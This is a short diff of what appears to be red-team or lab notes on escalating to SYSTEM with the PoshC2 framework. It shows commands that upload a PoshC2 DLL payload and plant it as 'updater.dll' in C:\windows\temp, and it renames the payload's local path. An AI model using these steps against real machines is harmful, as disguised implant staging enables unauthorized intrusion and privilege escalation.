@@ -100,7 +100,7 @@ Lets escalte to system through execution
 Upload a the dll to the machine 
 ```ps
 > upload-file 
-> /var/poshc2/projetname/payloads/Sharp_v4_dropper_x64.dll
+> /var/poshc2/projetname/payloads/Sharp_v4_x64.dll
 > location C:\windows\temp\updater.dll 
 ```
 
